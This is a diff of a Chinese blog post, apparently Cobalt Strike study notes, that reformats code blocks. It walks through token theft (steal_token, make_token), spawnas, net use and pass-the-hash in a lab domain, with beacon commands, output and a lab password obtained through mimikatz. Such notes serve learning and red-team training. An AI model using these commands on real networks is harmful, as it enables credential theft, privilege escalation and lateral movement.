@@ -473,45 +473,99 @@
 <li>使用 <code>rev2self</code> 移除令牌</li>
 </ul>
 <p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
+[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
+[+] host called home, sent: 55 bytes
+[+] received output:
+拒绝访问。</code></pre>
 <p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">ps</span></span><br><span class="line">[*] Tasked beacon to list processes</span><br><span class="line">[+] host called home, sent: <span class="number">12</span> bytes</span><br><span class="line">[*] <span class="keyword">Process</span> List</span><br><span class="line"> PID   PPID  Name                         Arch  Session     User</span><br><span class="line"> ---   ----  ----                         ----  -------     -----</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [<span class="type">System</span> <span class="type">Process</span>]                               </span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                       x64   <span class="number">0</span>           NT AUTHORITY\SYSTEM</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"> <span class="number">3720</span>  <span class="number">524</span>   taskhost.exe                 x64   <span class="number">2</span>           WIN<span class="literal">-75F8PRJM4TP</span>\Administrator</span><br><span class="line"> <span class="number">4092</span>  <span class="number">236</span>   dwm.exe                      x64   <span class="number">3</span>           TEAMSSIX\Administrator</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; ps
+[*] Tasked beacon to list processes
+[+] host called home, sent: 12 bytes
+[*] Process List
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ 0     0     [System Process]                               
+ 4     0     System                       x64   0           NT AUTHORITY\SYSTEM
+……内容太多，此处省略……
+ 3720  524   taskhost.exe                 x64   2           WIN-75F8PRJM4TP\Administrator
+ 4092  236   dwm.exe                      x64   3           TEAMSSIX\Administrator</code></pre>
 <p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; steal_token <span class="number">4092</span></span><br><span class="line">[*] Tasked beacon to steal token from PID <span class="number">4092</span></span><br><span class="line">[+] host called home, sent: <span class="number">12</span> bytes</span><br><span class="line">[+] Impersonated TEAMSSIX\administrator</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; steal_token 4092
+[*] Tasked beacon to steal token from PID 4092
+[+] host called home, sent: 12 bytes
+[+] Impersonated TEAMSSIX\administrator</code></pre>
 <p>查看一下当前会话 uid</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br><span class="line">[*] You are TEAMSSIX\administrator (admin)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; getuid
+[*] Tasked beacon to get userid
+[+] host called home, sent: 8 bytes
+[*] You are TEAMSSIX\administrator (admin)</code></pre>
 <p>再次尝试获取域控制器主机下的文件</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件      <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">4</span> 个目录 <span class="number">28</span>,<span class="number">493</span>,<span class="number">299</span>,<span class="number">712</span> 可用字节</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
+[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
+[+] host called home, sent: 55 bytes
+[+] received output:
+ 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
+ 卷的序列号是 F269-89A7
+ \\WIN-P2AASSD1AF1\C$ 的目录
+2020/07/16  21:24    &lt;DIR&gt;          Program Files
+2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)
+2020/07/17  23:00    &lt;DIR&gt;          Users
+2020/07/26  00:55    &lt;DIR&gt;          Windows
+               0 个文件      0 字节
+               4 个目录 28,493,299,712 可用字节</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs17-1.png"></p>
 <p>发现可以成功访问了，使用  <code>rev2self</code> 可移除当前窃取的令牌</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">beacon&gt; rev2self
+[*] Tasked beacon to revert token
+[+] host called home, sent: 8 bytes</code></pre>
 <p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p>
- <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br><span class="line">[*] You are NT AUTHORITY\SYSTEM (admin)</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">beacon&gt; getuid
+[*] Tasked beacon to get userid
+[+] host called home, sent: 8 bytes
+[*] You are NT AUTHORITY\SYSTEM (admin)
 
+beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
+[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
+[+] host called home, sent: 55 bytes
+[+] received output:
+拒绝访问。</code></pre>
 <h1 id="0x02-凭证"><a href="#0x02-凭证" class="headerlink" title="0x02 凭证"></a>0x02 凭证</h1><p>1、使用 make_token 创建一个令牌</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token DOMAIN\user password</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">make_token DOMAIN\user password</code></pre>
 <p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a target="_blank" rel="noopener" href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍。</p>
 <p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; make_token TEAMSSIX\administrator Test111!</span><br><span class="line">[*] Tasked beacon to create a token <span class="keyword">for</span> TEAMSSIX\administrator</span><br><span class="line">[+] host called home, sent: <span class="number">53</span> bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件      <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">4</span> 个目录 <span class="number">28</span>,<span class="number">493</span>,<span class="number">299</span>,<span class="number">712</span> 可用字节</span><br><span class="line">               </span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WIN<span class="literal">-P2AASSD1AF1</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WIN<span class="literal">-P2AASSD1AF1</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">231</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">teamssix\administrator</span><br></pre></td></tr></table></figure>
+<pre><code class="powershell">beacon&gt; make_token TEAMSSIX\administrator Test111!
+[*] Tasked beacon to create a token for TEAMSSIX\administrator
+[+] host called home, sent: 53 bytes
+[+] Impersonated NT AUTHORITY\SYSTEM
 
+beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
+[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
+[+] host called home, sent: 55 bytes
+[+] received output:
+ 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
+ 卷的序列号是 F269-89A7
+ \\WIN-P2AASSD1AF1\C$ 的目录
+2020/07/16  21:24    &lt;DIR&gt;          Program Files
+2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)
+2020/07/17  23:00    &lt;DIR&gt;          Users
+2020/07/26  00:55    &lt;DIR&gt;          Windows
+               0 个文件      0 字节
+               4 个目录 28,493,299,712 可用字节
+
+beacon&gt; powershell Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock &#123;whoami&#125;
+[*] Tasked beacon to run: Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock &#123;whoami&#125;
+[+] host called home, sent: 231 bytes
+[+] received output:
+teamssix\administrator</code></pre>
 <p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p>
 <p>2、使用 spawn beacon 替代凭证</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawnas DOMAIN\user password</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">spawnas DOMAIN\user password</code></pre>
 <p>3、在目标上建立账户</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\host\C<span class="variable">$</span>/USER:DOMAIN\user password</span><br></pre></td></tr></table></figure>
-
+<pre><code class="powershell">net use \\host\C$/USER:DOMAIN\user password</code></pre>
 <p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p>
 <h1 id="0x03-密码哈希"><a href="#0x03-密码哈希" class="headerlink" title="0x03 密码哈希"></a>0x03 密码哈希</h1><p>使用 mimikatz 获取密码哈希</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth DOMAIN\user ntlmhash</span><br></pre></td></tr></table></figure>
-
+<pre><code>pth DOMAIN\user ntlmhash</code></pre>
 <p>如何工作的？</p>
 <p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p>
 <p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p>
@@ -950,7 +1004,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
